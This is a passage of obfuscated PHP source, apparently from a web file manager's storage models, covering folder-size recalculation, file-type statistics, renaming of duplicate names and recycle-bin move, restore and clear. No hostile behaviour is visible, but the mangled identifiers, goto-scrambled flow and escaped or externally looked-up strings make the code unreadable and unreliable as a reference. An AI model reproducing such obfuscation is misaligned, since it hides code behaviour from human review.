$e¿ó×â¯Ù[411] => time()); goto f™Ù¤ãæÕ‚; cõ¡Â¸ÚÌ: $e¿ó×â¯Ù =& $_SERVER[…ë˜õ]; if (!$Föó®×®ÓÖ) { return; } if (!is_array($Föó®×®ÓÖ)) { $Föó®×®ÓÖ = array($Föó®×®ÓÖ); } goto a‹„õ«¤ŠË; f™Ù¤ãæÕ‚: $this->where($a¿¨ÃŞÙª´)->save($aÄ¬à‹äå¹); goto C¢ªé”ÀŒ; C¢ªé”ÀŒ: } public function folderSizeReset($bƒÄÚ‹Çê, $FĞ¾® Ÿ = false) { goto dãËˆ²ã¼; Dö¨‹ÎÉ—š: if ($FĞ¾® Ÿ == 0) { return CacheLock::unlock($Bâ˜›¾…Ë†); } $f†Š¸Àô¥… = $this->parentLevelArray($eãÔÓïËø[$aÙ§µ¢×£®[481]]); if (!$f†Š¸Àô¥…) { $f†Š¸Àô¥… = array(); } goto D«²ƒ—ëÄ; b­‚æĞ¡æ: $Bâ˜›¾…Ë† = $aÙ§µ¢×£®[1983] . $bƒÄÚ‹Çê; CacheLock::lock($Bâ˜›¾…Ë†, 20); if ($FĞ¾® Ÿ === !1) { $this->sourceCacheClear($bƒÄÚ‹Çê); $eãÔÓïËø = $this->sourceInfo($bƒÄÚ‹Çê); $Fî¤ª°Í = array($aÙ§µ¢×£®[389] => $bƒÄÚ‹Çê, $aÙ§µ¢×£®[416] => 0); $F£…Ñ¿«¤ = $this->where($Fî¤ª°Í)->sum($aÙ§µ¢×£®[77]); $FĞ¾® Ÿ = intval($F£…Ñ¿«¤) - intval($eãÔÓïËø[$aÙ§µ¢×£®[77]]); } goto Dö¨‹ÎÉ—š; D¯’œÛ°¬Ş: $this->where($Fî¤ª°Í)->setAdd($aÙ§µ¢×£®[77], $FĞ¾® Ÿ); CacheLock::unlock($Bâ˜›¾…Ë†); $d¬Ôô©À­” = $aÙ§µ¢×£®[1984] . $eãÔÓïËø[$aÙ§µ¢×£®[398]] . $aÙ§µ¢×£®[4] . $eãÔÓïËø[$aÙ§µ¢×£®[478]]; goto cÒËŠ¹ÎÑ; cÒËŠ¹ÎÑ: $FÀ„‘äÚÆê = array($eãÔÓïËø[$aÙ§µ¢×£®[398]], $eãÔÓïËø[$aÙ§µ¢×£®[478]]); TaskRun::timeLimitCall($d¬Ôô©À­”, $aÙ§µ¢×£®[1985], $FÀ„‘äÚÆê, 1.5); goto b½äÃŒ”Ö; D«²ƒ—ëÄ: $f†Š¸Àô¥…[] = $eãÔÓïËø[$aÙ§µ¢×£®[390]]; $Fî¤ª°Í = array($aÙ§µ¢×£®[390] => array($aÙ§µ¢×£®[405], $f†Š¸Àô¥…)); if ($FĞ¾® Ÿ < 0) { $Fî¤ª°Í[$aÙ§µ¢×£®[77]] = array($aÙ§µ¢×£®[978], abs($FĞ¾® Ÿ)); } goto D¯’œÛ°¬Ş; dãËˆ²ã¼: $aÙ§µ¢×£® =& $_SERVER[…ë˜õ]; if ($this->statusIgnoreResetSpace) { return; } $eãÔÓïËø = $this->sourceInfo($bƒÄÚ‹Çê); goto b­‚æĞ¡æ; b½äÃŒ”Ö: } public function folderSizeResetChildren($fù³ãè‘é) { goto D¶ŞÕÓÅæé; dÁî†­î²’: foreach ($CÖÔ¤ß‡„É as $b–ƒ·öéÅ®) { $f˜×—™ÔË® = $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[472]] . $bŸŸ‘Şøé¹[33]; if (!isset($D•õ‘›Éï[$f˜×—™ÔË®])) { continue; } if ($b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[417]] == $D•õ‘›Éï[$f˜×—™ÔË®][$bŸŸ‘Şøé¹[417]]) { $D•õ‘›Éï[$f˜×—™ÔË®][$bŸŸ‘Şøé¹[77]] += $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[77]]; } } foreach ($D•õ‘›Éï as $b–ƒ·öéÅ®) { $Bš¹²ŠáäÁ = $this->parentLevelArray($b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[481]]); foreach ($Bš¹²ŠáäÁ as $f˜×—™ÔË®) { $f˜×—™ÔË® = $f˜×—™ÔË® . $bŸŸ‘Şøé¹[33]; if (!isset($D•õ‘›Éï[$f˜×—™ÔË®])) { continue; } if ($b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[417]] == $D•õ‘›Éï[$f˜×—™ÔË®][$bŸŸ‘Şøé¹[417]]) { $D•õ‘›Éï[$f˜×—™ÔË®][$bŸŸ‘Şøé¹[77]] += $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[77]]; } } } $D†ñÂ¦ á„ = array(); goto bÜ³‹ÙçŠÍ; D¶ŞÕÓÅæé: $bŸŸ‘Şøé¹ =& $_SERVER[…ë˜õ]; $this->sourceCacheClear($fù³ãè‘é); $b¾ä•Šì‡¹ = $this->sourceInfo($fù³ãè‘é); goto Eì…Ê†Ç; cÔÂô£‚ÖŠ: $D•õ‘›Éï[] = $b¾ä•Šì‡¹; $D•õ‘›Éï = array_to_keyvalue($D•õ‘›Éï, $bŸŸ‘Şøé¹[390]); foreach ($D•õ‘›Éï as $E£ŞÑ¹ïÍÆ => $b–ƒ·öéÅ®) { $D•õ‘›Éï[$E£ŞÑ¹ïÍÆ][$bŸŸ‘Şøé¹[1987]] = $D•õ‘›Éï[$E£ŞÑ¹ïÍÆ][$bŸŸ‘Şøé¹[77]]; $D•õ‘›Éï[$E£ŞÑ¹ïÍÆ][$bŸŸ‘Şøé¹[77]] = 0; } goto dÁî†­î²’; bÜ³‹ÙçŠÍ: foreach ($D•õ‘›Éï as $b–ƒ·öéÅ®) { if ($b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[77]] == $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[1987]]) { continue; } $D†ñÂ¦ á„[] = array($bŸŸ‘Şøé¹[390], $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[390]], $bŸŸ‘Şøé¹[77], $b–ƒ·öéÅ®[$bŸŸ‘Şøé¹[77]]); } $this->saveAll($D†ñÂ¦ á„); goto fŸ¨è©æô˜; cí«ÆÃÀ³: $D˜Ûµö‚©[$bŸŸ‘Şøé¹[397]] = 0; $CÖÔ¤ß‡„É = $this->field($eÈŠ¤’†¿Ò)->where($D˜Ûµö‚©)->select(); if (!$CÖÔ¤ß‡„É) { return; } goto cÔÂô£‚ÖŠ; Eì…Ê†Ç: $D˜Ûµö‚© = array($bŸŸ‘Şøé¹[541] => 1, $bŸŸ‘Şøé¹[548] => array($bŸŸ‘Şøé¹[507], $b¾ä•Šì‡¹[$bŸŸ‘Şøé¹[481]] . $fù³ãè‘é . $bŸŸ‘Şøé¹[508])); $eÈŠ¤’†¿Ò = $bŸŸ‘Şøé¹[1986]; $D•õ‘›Éï = $this->field($eÈŠ¤’†¿Ò)->where($D˜Ûµö‚©)->select(); goto cí«ÆÃÀ³; fŸ¨è©æô˜: } public function userSpaceReset($bæ—ŞåÎø  = false) { $DŠÏ´Š±Ğµ =& $_SERVER[…ë˜õ]; $Bî¾ˆ—³¾± = $this->where(array($DŠÏ´Š±Ğµ[398] => self::TYPE_USER, $DŠÏ´Š±Ğµ[478] => $bæ—ŞåÎø , $DŠÏ´Š±Ğµ[397] => 0))->sum($DŠÏ´Š±Ğµ[77]); $Bî¾ˆ—³¾± = !$Bî¾ˆ—³¾± || $Bî¾ˆ—³¾± <= 0 ? 0 : $Bî¾ˆ—³¾±; Model($DŠÏ´Š±Ğµ[497])->userEdit($bæ—ŞåÎø , array($DŠÏ´Š±Ğµ[1680] => $Bî¾ˆ—³¾±)); } public function targetSpaceUpdate($Dî‹´‘ïğ, $A§Ùçî‹Ì) { $AÛÈßèôÈâ =& $_SERVER[…ë˜õ]; if (!$A§Ùçî‹Ì) { return; } if (!in_array($Dî‹´‘ïğ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f÷ÑáÆîëé = $this->targetSpaceSize($Dî‹´‘ïğ, $A§Ùçî‹Ì); if ($Dî‹´‘ïğ == self::TYPE_USER) { Model($AÛÈßèôÈâ[497])->userEdit($A§Ùçî‹Ì, array($AÛÈßèôÈâ[1680] => $f÷ÑáÆîëé)); } else { if ($Dî‹´‘ïğ == self::TYPE_GROUP) { Model($AÛÈßèôÈâ[480])->groupEdit($A§Ùçî‹Ì, array($AÛÈßèôÈâ[1680] => $f÷ÑáÆîëé)); } } } public function targetSpaceSize($B–éšá‡òŒ, $Díƒõ‘Ñ°) { goto FøÉ†ƒĞš±; B‚ß‰ì¡¦: $eÀ ²—³œ® = !$eÀ ²—³œ® || $eÀ ²—³œ® <= 0 ? 0 : $eÀ ²—³œ®; return $eÀ ²—³œ®; goto FÏç”à¹ã¶; dèã¥À™: $CÉàÌÖÊ·´ = array_to_keyvalue($CÉàÌÖÊ·´, $bà”ßÁ†¸[33], $bà”ßÁ†¸[390]); $CÉàÌÖÊ·´ = array_unique(array_filter($CÉàÌÖÊ·´)); if ($CÉàÌÖÊ·´) { $b÷„Ì»Š¬ = array($bà”ßÁ†¸[404] => array($bà”ßÁ†¸[405], $CÉàÌÖÊ·´)); $eÀ ²—³œ® += floatval($this->where($b÷„Ì»Š¬)->sum($bà”ßÁ†¸[77])); } goto B‚ß‰ì¡¦; FøÉ†ƒĞš±: $bà”ßÁ†¸ =& $_SERVER[…ë˜õ]; $d½ÚëˆÒù  = $this->sourceRoot($B–éšá‡òŒ, $Díƒõ‘Ñ°, !0); if (!$d½ÚëˆÒù ) { return 0; } goto aø¸‰İïôİ; aø¸‰İïôİ: $eÀ ²—³œ® = floatval($d½ÚëˆÒù [$bà”ßÁ†¸[77]]); $b÷„Ì»Š¬ = array($bà”ßÁ†¸[548] => array($bà”ßÁ†¸[507], $bà”ßÁ†¸[493] . $d½ÚëˆÒù [$bà”ßÁ†¸[390]] . $bà”ßÁ†¸[508])); $CÉàÌÖÊ·´ = Model($bà”ßÁ†¸[415])->field($bà”ßÁ†¸[404])->where($b÷„Ì»Š¬)->select(); goto dèã¥À™; FÏç”à¹ã¶: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($A¬çé›ì¿) { return $this->fileTypeProfile($A¬çé›ì¿, SourceModel::TYPE_USER); } public function groupFileTypeProfile($a²Ì„ã†“) { return $this->fileTypeProfile($a²Ì„ã†“, SourceModel::TYPE_GROUP); } private function fileTypeProfile($f™îƒ²„, $c¿»§Å‡‘«) { goto dòÉÂÙ…­Ç; dòÉÂÙ…­Ç: $E…ß„õÍ» =& $_SERVER[…ë˜õ]; $AëÕÂëìø“ = $E…ß„õÍ»[1988] . $f™îƒ²„ . $E…ß„õÍ»[70] . $c¿»§Å‡‘«; $BÅŒÜêì‰² = Cache::get($AëÕÂëìø“); goto DöÜ¸İŒë; E¼¨…ŞÉòô: foreach ($DÄ¦æ¸¥ÔŠ as $f×óçá¯ñ¹ => $F¸ê‚™Ş—‘) { $d÷‡ˆ»„Åø[$E…ß„õÍ»[399]] = $this->fileTypeWhere($f×óçá¯ñ¹); $aÏç»òŸ[$f×óçá¯ñ¹] = array($E…ß„õÍ»[1990] => $F¸ê‚™Ş—‘[$E…ß„õÍ»[28]], $E…ß„õÍ»[1991] => $this->where($d÷‡ˆ»„Åø)->count(), $E…ß„õÍ»[543] => $this->where($d÷‡ˆ»„Åø)->sum($E…ß„õÍ»[77])); } Cache::set($AëÕÂëìø“, $aÏç»òŸ, 1200); return $aÏç»òŸ; goto DŞÅˆ£­ç; DöÜ¸İŒë: if ($BÅŒÜêì‰²) { return $BÅŒÜêì‰²; } $d÷‡ˆ»„Åø = array($E…ß„õÍ»[541] => 0); if ($f™îƒ²„ != !1) { $d÷‡ˆ»„Åø[$E…ß„õÍ»[478]] = $f™îƒ²„; $d÷‡ˆ»„Åø[$E…ß„õÍ»[398]] = $c¿»§Å‡‘«; } goto c‰Õ‡ØŒ¾“; c‰Õ‡ØŒ¾“: $aÏç»òŸ = array(); $aÏç»òŸ[$E…ß„õÍ»[1989]] = array($E…ß„õÍ»[1990] => LNG($E…ß„õÍ»[1989]), $E…ß„õÍ»[1991] => $this->where($d÷‡ˆ»„Åø)->count(), $E…ß„õÍ»[543] => $this->where($d÷‡ˆ»„Åø)->sum($E…ß„õÍ»[77])); $DÄ¦æ¸¥ÔŠ = KodIO::fileTypeList(); goto E¼¨…ŞÉòô; DŞÅˆ£­ç: } public function fileNameExist($bÕÜ¥ÓŞÖ, $EåöÏõ™êÖ) { $F§‚¦Õ¹Ûº =& $_SERVER[…ë˜õ]; $D¹áÍ˜¹åŸ = $this->childList($bÕÜ¥ÓŞÖ); foreach ($D¹áÍ˜¹åŸ as $bÃœ†½ºô²) { if ($bÃœ†½ºô²[$F§‚¦Õ¹Ûº[28]] == $EåöÏõ™êÖ) { return $bÃœ†½ºô²[$F§‚¦Õ¹Ûº[390]]; } if (strtolower($bÃœ†½ºô²[$F§‚¦Õ¹Ûº[28]]) == strtolower($EåöÏõ™êÖ)) { return $bÃœ†½ºô²[$F§‚¦Õ¹Ûº[390]]; } } return !1; } public function childList($e…ï¡ùµ³) { goto dÅÍ†Ôƒ“…; FËåØ†¿å: self::$cacheChildList[$fŠÍ¶š’Ü”] = $F»¡ˆÍŞ±ï; foreach ($F»¡ˆÍŞ±ï as $B¦¾‹óåœè) { $fŠÍ¶š’Ü” = $cİ–ÇãƒÃ[432] . $B¦¾‹óåœè[$cİ–ÇãƒÃ[390]]; self::$cacheSourceInfo[$fŠÍ¶š’Ü”] = $B¦¾‹óåœè; } return $F»¡ˆÍŞ±ï; goto f«éÄ©ª¼®; E­ ‹™‰¦Ÿ: $aõ°Ñ¹Õø = array($cİ–ÇãƒÃ[472] => intval($e…ï¡ùµ³), $cİ–ÇãƒÃ[417] => 0); $F»¡ˆÍŞ±ï = $this->where($aõ°Ñ¹Õø)->select(); $F»¡ˆÍŞ±ï = $F»¡ˆÍŞ±ï ? $F»¡ˆÍŞ±ï : array(); goto FËåØ†¿å; dÅÍ†Ôƒ“…: $cİ–ÇãƒÃ =& $_SERVER[…ë˜õ]; $fŠÍ¶š’Ü” = $cİ–ÇãƒÃ[1966] . $e…ï¡ùµ³; if (isset(self::$cacheChildList[$fŠÍ¶š’Ü”])) { return self::$cacheChildList[$fŠÍ¶š’Ü”]; } goto E­ ‹™‰¦Ÿ; f«éÄ©ª¼®: } public function fileNameAuto($c¥ä­Óö‹¾, $B·³Ä¼é, $a´««é¨† = REPEAT_RENAME, $e”ªÆŒ¹­Á = false) { $c—›Ÿá´ˆë =& $_SERVER[…ë˜õ]; $bŠ¶Éˆ†¦ = $this->childList($c¥ä­Óö‹¾); $F×ğ¾´‡èº = array_to_keyvalue($bŠ¶Éˆ†¦, $c—›Ÿá´ˆë[33], $c—›Ÿá´ˆë[28]); return $this->fileNameAutoGet($F×ğ¾´‡èº, $B·³Ä¼é, $a´««é¨†, $e”ªÆŒ¹­Á); } public function fileNameAutoGet($Aˆ“…ä”Ì, $b‰âÎ‡ì», $e±…¦£ÃÅ, $eğÀ¨‹ùÑ¼) { $Fåø¾ë¬Œí =& $_SERVER[…ë˜õ]; if ($e±…¦£ÃÅ == REPEAT_REPLACE || !$Aˆ“…ä”Ì || !in_array_not_case($b‰âÎ‡ì», $Aˆ“…ä”Ì) || $eğÀ¨‹ùÑ¼ && $e±…¦£ÃÅ != REPEAT_RENAME_FOLDER) { return $b‰âÎ‡ì»; } if ($e±…¦£ÃÅ == REPEAT_SKIP) { return !1; } $e¸øë…êÉ¾ = $Fåø¾ë¬Œí[94] . get_path_ext($b‰âÎ‡ì»); $e¸øë…êÉ¾ = $e¸øë…êÉ¾ == $Fåø¾ë¬Œí[94] || $eğÀ¨‹ùÑ¼ ? $Fåø¾ë¬Œí[33] : $e¸øë…êÉ¾; for ($aï¿“Ûù¹° = 1; $aï¿“Ûù¹° <= count($Aˆ“…ä”Ì) + 1; $aï¿“Ûù¹°++) { $E„àŠ›‚äè = substr($b‰âÎ‡ì», 0, strlen($b‰âÎ‡ì») - strlen($e¸øë…êÉ¾)); $d¤¯‹ô¹‘š = $E„àŠ›‚äè . "\x28{$aï¿“Ûù¹°}\51{$e¸øë…êÉ¾}"; if (!in_array_not_case($d¤¯‹ô¹‘š, $Aˆ“…ä”Ì)) { return $d¤¯‹ô¹‘š; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\143\145\137\x72\x65\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\x69\155\145", "\164\151\155\145", "\x69\156\x73\x65\162\164", "\146\x75\156\143\164\x69\157\x6e")); public function listData($B¨‹ø§Ô±‚ = false) { $AÁ§Ô·°¥À =& $_SERVER[…ë˜õ]; $B¨‹ø§Ô±‚ = $B¨‹ø§Ô±‚ ? $B¨‹ø§Ô±‚ : USER_ID; $D¹âšˆÄ‰… = $this->where(array($AÁ§Ô·°¥À[1522] => $B¨‹ø§Ô±‚))->select(); return array_to_keyvalue($D¹âšˆÄ‰…, $AÁ§Ô·°¥À[33], $AÁ§Ô·°¥À[390]); } public function moveToRecycle($cŒŸ¸ÌªØØ) { goto FáÌºõøÖˆ; FáÌºõøÖˆ: $C£îŸ¨Ÿê =& $_SERVER[…ë˜õ]; $A…ÇÊ†°¸ = Model($C£îŸ¨Ÿê[1209]); $aºªç—î¯© = $A…ÇÊ†°¸->sourceInfo($cŒŸ¸ÌªØØ); goto b˜ºøåùö; b˜ºøåùö: if (!$aºªç—î¯© || $aºªç—î¯©[$C£îŸ¨Ÿê[417]] == $C£îŸ¨Ÿê[86]) { return; } $dŒæçÍ‚ğ = array($C£îŸ¨Ÿê[404] => $cŒŸ¸ÌªØØ, $C£îŸ¨Ÿê[1522] => USER_ID, $C£îŸ¨Ÿê[544] => $aºªç—î¯©[$C£îŸ¨Ÿê[398]], $C£îŸ¨Ÿê[545] => $aºªç—î¯©[$C£îŸ¨Ÿê[478]], $C£îŸ¨Ÿê[548] => $aºªç—î¯©[$C£îŸ¨Ÿê[481]]); $this->add($dŒæçÍ‚ğ); goto e©Ò« «Åì; e©Ò« «Åì: $this->recycleMove($cŒŸ¸ÌªØØ, 1); if ($aºªç—î¯©[$C£îŸ¨Ÿê[397]] == $C£îŸ¨Ÿê[86]) { $aêÊ»Ä³ñ = array($C£îŸ¨Ÿê[548] => array($C£îŸ¨Ÿê[507], $aºªç—î¯©[$C£îŸ¨Ÿê[481]] . $cŒŸ¸ÌªØØ . $C£îŸ¨Ÿê[508])); $A…ÇÊ†°¸->where($aêÊ»Ä³ñ)->setField($C£îŸ¨Ÿê[417], 1); } goto cíÓ³È´Ä; cíÓ³È´Ä: } public function clear() { $this->remove(!1); } public function remove($c¶¾ä Ÿ” = false) { goto B“˜Õ‘; B“˜Õ‘: $CÜÜæè•Ø =& $_SERVER[…ë˜õ]; $fÒÛ“¶¨®“ = Model($CÜÜæè•Ø[1209]); $f¬ää‡Íù» = $this->listData(); goto eå²ë·”í; eå²ë·”í: $c¶¾ä Ÿ” = $c¶¾ä Ÿ” === !1 ? !1 : $c¶¾ä Ÿ”; $Fã¦ãçòÁÆ = array(); foreach ($f¬ää‡Íù» as $FÀ—†´¶ÄŠ) { if ($c¶¾ä Ÿ” != !1 && !in_array($FÀ—†´¶ÄŠ, $c¶¾ä Ÿ”)) { continue; } $BïÜ‹­Ôøƒ = $fÒÛ“¶¨®“->sourceInfo($FÀ—†´¶ÄŠ); $fÒÛ“¶¨®“->remove($FÀ—†´¶ÄŠ, !1); $F¾äÛÑ ßÛ = $BïÜ‹­Ôøƒ[$CÜÜæè•Ø[398]] . $CÜÜæè•Ø[70] . $BïÜ‹­Ôøƒ[$CÜÜæè•Ø[478]]; $Fã¦ãçòÁÆ[$F¾äÛÑ ßÛ] = array($CÜÜæè•Ø[544] => $BïÜ‹­Ôøƒ[$CÜÜæè•Ø[398]], $CÜÜæè•Ø[478] => $BïÜ‹­Ôøƒ[$CÜÜæè•Ø[478]]); $this->where(array($CÜÜæè•Ø[390] => $FÀ—†´¶ÄŠ))->delete(); } goto A‡ğò…¸½; A‡ğò…¸½: foreach ($Fã¦ãçòÁÆ as $D±¬ÛŠÊÃá) { $fÒÛ“¶¨®“->targetSpaceUpdate($D±¬ÛŠÊÃá[$CÜÜæè•Ø[398]], $D±¬ÛŠÊÃá[$CÜÜæè•Ø[478]]); } goto Fåí½¡Å…; Fåí½¡Å…: } public function restore($EµëÑÇ¬·Ë = false) { $b‚Šôëˆôì = $this->listData(); $this->_restoreSource($b‚Šôëˆôì, $EµëÑÇ¬·Ë); } public function restoreUserAll($A§„ëâ§¥Š) { $E†á½¬ª¥ = $this->listData($A§„ëâ§¥Š); $this->_restoreSource($E†á½¬ª¥, !1); } private function _restoreSource($dâèŠ÷­À‚, $aÃù½ì¬ğã) { goto d¾Àá¯…«Ù; f¿¸¯°†õ‚: if (!$dâèŠ÷­À‚) { return !0; } $FÉé¥äÂââ = array(); foreach ($dâèŠ÷­À‚ as $Fâ¢œâ‚ø) { goto E“£İÇ‚Ëë; DÓ”¢îï“É: $FÉé¥äÂââ[] = $BÁß‡•â ¦[$f‡Ëô¿¿„‘[472]]; if ($BÁß‡•â ¦[$f‡Ëô¿¿„‘[397]] == $f‡Ëô¿¿„‘[86]) { $FÉé¥äÂââ[] = $Fâ¢œâ‚ø; } $DŒ•†¹Í¢->lockMoveEnd($Fâ¢œâ‚ø); goto bñÎÁé†ñ´; E¬¨íİ¬´: if ($BÁß‡•â ¦[$f‡Ëô¿¿„‘[397]] == $f‡Ëô¿¿„‘[86]) { $d¡‰ä´„ŸŠ = array($f‡Ëô¿¿„‘[548] => array($f‡Ëô¿¿„‘[507], $BÁß‡•â ¦[$f‡Ëô¿¿„‘[481]] . $Fâ¢œâ‚ø . $f‡Ëô¿¿„‘[508])); $DŒ•†¹Í¢->where($d¡‰ä´„ŸŠ)->setField($f‡Ëô¿¿„‘[417], 0); $this->restoreFolderChildren($Fâ¢œâ‚ø, $dâèŠ÷­À‚); } $this->where(array($f‡Ëô¿¿„‘[390] => $Fâ¢œâ‚ø))->delete(); $DŒ•†¹Í¢->folderSizeReset($BÁß‡•â ¦[$f‡Ëô¿¿„‘[472]]); goto DÓ”¢îï“É; E“£İÇ‚Ëë: if ($aÃù½ì¬ğã != !1 && !in_array($Fâ¢œâ‚ø, $aÃù½ì¬ğã)) { continue; } $BÁß‡•â ¦ = $DŒ•†¹Í¢->sourceInfo($Fâ¢œâ‚ø); $D³¸»ªÕÏĞ = $DŒ•†¹Í¢->sourceInfo($BÁß‡•â ¦[$f‡Ëô¿¿„‘[472]]); goto c‹‹¯· ¾í; c‹‹¯· ¾í: if ($D³¸»ªÕÏĞ[$f‡Ëô¿¿„‘[417]] == $f‡Ëô¿¿„‘[86]) { continue; } $DŒ•†¹Í¢->lockMoveStart($Fâ¢œâ‚ø); $this->recycleMove($Fâ¢œâ‚ø, 0); goto E¬¨íİ¬´; bñÎÁé†ñ´: } goto E²¯……˜Á™; E²¯……˜Á™: $DŒ•†¹Í¢->updateModifyTime($FÉé¥äÂââ); goto c›ƒ¤—Äô; d¾Àá¯…«Ù: $f‡Ëô¿¿„‘ =& $_SERVER[…ë˜õ]; $DŒ•†¹Í¢ = Model($f‡Ëô¿¿„‘[1209]); $aÃù½ì¬ğã = $aÃù½ì¬ğã == !1 ? !1 : $aÃù½ì¬ğã; goto f¿¸¯°†õ‚; c›ƒ¤—Äô: } private function restoreFolderChildren($d ã¶¹â¦à, $d‹¥àÖ—÷‚) { goto AŸØãå¼–ƒ; AŸØãå¼–ƒ: $eµÒÜ«ğìº =& $_SERVER[…ë˜õ]; $bë’¬ß£ = Model($eµÒÜ«ğìº[1209]); $f¢ÃÂé¡îÆ = array($eµÒÜ«ğìº[390] => array($eµÒÜ«ğìº[7], array())); goto Aº³ËêŠôĞ; Aº³ËêŠôĞ: foreach ($d‹¥àÖ—÷‚ as $aÛÂ…Ôø›ˆ) { if ($aÛÂ…Ôø›ˆ == $d ã¶¹â¦à) { continue; } if (!$bë’¬ß£->isParentOf($d ã¶¹â¦à, $aÛÂ…Ôø›ˆ)) { continue; } $F³ÔëØµóœ = $bë’¬ß£->sourceInfo($aÛÂ…Ôø›ˆ); if ($F³ÔëØµóœ[$eµÒÜ«ğìº[397]] == $eµÒÜ«ğìº[86]) { $f¢ÃÂé¡îÆ[] = array($eµÒÜ«ğìº[548] => array($eµÒÜ«ğìº[507], $F³ÔëØµóœ[$eµÒÜ«ğìº[481]] . $aÛÂ…Ôø›ˆ . $eµÒÜ«ğìº[508])); } else { $f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[390]][1][] = $aÛÂ…Ôø›ˆ; } } if (!$f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[390]][1]) { unset($f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[390]]); } if (!$f¢ÃÂé¡îÆ) { return; } goto a–†Ú¹ÅåĞ; a–†Ú¹ÅåĞ: $f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[390]][1] = array_unique($f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[390]][1]); $f¢ÃÂé¡îÆ[$eµÒÜ«ğìº[963]] = $eµÒÜ«ğìº[1783]; $bë’¬ß£->where($f¢ÃÂé¡îÆ)->setField($eµÒÜ«ğìº[417], 1); goto bÓ¦Ôîø™; bÓ¦Ôîø™: } private function recycleMove($D‚ÈÃŒÔó—, $FÏì·Ó¸ö = 1) { $a‚ºÄ¥õÁÊ =& $_SERVER[…ë˜õ]; $BĞ•Äõã = Model($a‚ºÄ¥õÁÊ[1209]); $cì±äƒìÔ¾ = Model($a‚ºÄ¥õÁÊ[1992]); $bÑÔ®ù¬†µ = array($a‚ºÄ¥õÁÊ[390] => $D‚ÈÃŒÔó—); if ($FÏì·Ó¸ö) { $BĞ•Äõã->where($bÑÔ®ù¬†µ)->setField($a‚ºÄ¥õÁÊ[417], 1); $cì±äƒìÔ¾->eventRecycle($D‚ÈÃŒÔó—, $a‚ºÄ¥õÁÊ[1993]); } else { $E›ßçšÄ = $BĞ•Äõã->where($bÑÔ®ù¬†µ)->find(); $CĞÔçéƒ°¯ = $E›ßçšÄ[$a‚ºÄ¥õÁÊ[397]] == $a‚ºÄ¥õÁÊ[86]; $BÍ¬ï¬éÆ = $BĞ•Äõã->fileNameAuto($E›ßçšÄ[$a‚ºÄ¥õÁÊ[472]], $E›ßçšÄ[$a‚ºÄ¥õÁÊ[28]], REPEAT_RENAME_FOLDER, $CĞÔçéƒ°¯); if ($BÍ¬ï¬éÆ != $E›ßçšÄ[$a‚ºÄ¥õÁÊ[28]]) { $BĞ•Äõã->rename($D‚ÈÃŒÔó—, $BÍ¬ï¬éÆ); } $BĞ•Äõã->where($bÑÔ®ù¬†µ)->setField($a‚ºÄ¥õÁÊ[417], 0); $cì±äƒìÔ¾->eventRecycle($D‚ÈÃŒÔó—, $a‚ºÄ¥õÁÊ[1994]); } } } goto dÕ’ŒÕŒíÜ; a¾¨‚á¼Ö: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\x6d\145" => "\x69\157\x5f\163\157\165\162\x63\145\137\x6d\x65\164\x61", "\155\145\164\141\106\151\145\154\144" => "\x73\157\x75\162\143\145\111\104"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\x66\x75\156\143\x74\151\157\156"), array("\143\x72\x65\141\x74\145\x54\151\155\x65", "\164\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\x66\165\156\x63\x74\x69\157\156"), array("\x76\x69\145\167\124\x69\155\x65", "\164\151\155\x65", "\151\x6e\x73\x65\162\164", "\146\165\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($A»ö‚ˆ†´Ş) { return $this->listSource(array($_SERVER[…ë˜õ][389] => $A»ö‚ˆ†´Ş)); } public function typeName($CƒáéÁ») { static $Aˆ¸Ùß…¬“ = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $Aˆ¸Ùß…¬“[$CƒáéÁ» . $_SERVER[…ë˜õ][33]]; } public function sourceListInfo($aÈÂ¢ë«ö, $bÀ²Ñ—Œ›¡ = false) { goto d²¢á¬“É; d²¢á¬“É: $bÖÆˆ„¨êˆ =& $_SERVER[…ë˜õ]; $aÈÂ¢ë«ö = $aÈÂ¢ë«ö ? $aÈÂ¢ë«ö : array(); $aÈÂ¢ë«ö = array_filter(array_unique($aÈÂ¢ë«ö)); goto A’ƒá¶¾‡; c­Û¶ŠÄ: return array_to_keyvalue($B¢İ¬İ¿·Æ, $bÖÆˆ„¨êˆ[390]); goto B‚…­ÚöÍŒ; A’ƒá¶¾‡: if (!$aÈÂ¢ë«ö) { return array(); } $B¢İ¬İ¿·Æ = $this->where(array($bÖÆˆ„¨êˆ[390] => array($bÖÆˆ„¨êˆ[7], $aÈÂ¢ë«ö)))->select(); $this->_listDataApply($B¢İ¬İ¿·Æ, $bÀ²Ñ—Œ›¡); goto c­Û¶ŠÄ; B‚…­ÚöÍŒ: } public function pathInfoFilter(&$d¹ãìÂƒ±§) { goto fƒÏô¾Ü‰²; F¶«ÀÀù: if (!$aÏäÍ´¿Ö) { goto f²ªÌ’ÑŒ§; f²ªÌ’ÑŒ§: $EøâšÈìÅ = 